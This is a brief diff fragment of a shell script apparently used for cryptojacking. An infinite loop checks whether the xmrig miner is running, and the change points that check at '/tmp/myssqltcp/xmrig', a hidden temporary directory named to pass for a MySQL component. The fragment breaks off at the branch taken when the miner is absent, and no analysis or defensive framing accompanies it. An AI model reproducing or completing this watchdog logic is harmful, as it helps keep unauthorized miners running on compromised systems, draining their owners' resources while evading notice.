@@ -3,7 +3,7 @@
 VERSION=2.11
 while true
 do
-ps -ef | grep "xmrig" | grep -v "grep"
+ps -ef | grep "/tmp/myssqltcp/xmrig" | grep -v "grep"
 if [ "$?" -eq 1 ]
 then
 
